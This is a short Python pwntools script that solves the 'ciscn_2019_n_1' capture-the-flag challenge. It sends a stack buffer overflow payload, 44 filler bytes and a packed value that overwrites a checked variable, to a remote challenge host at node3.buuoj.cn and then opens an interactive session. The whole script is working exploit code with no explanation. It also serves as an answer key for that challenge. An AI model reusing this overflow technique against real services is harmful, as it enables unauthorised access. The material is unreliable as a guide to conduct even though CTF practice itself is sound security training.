from pwn import *

payload = 'a' * 44 + p32(0x41348000)

#p = process('./ciscn_2019_n_1')
p = remote('node3.buuoj.cn', 29635)

p.recvuntil("Let's guess the number.\n")

p.sendline(payload)

p.interactive()
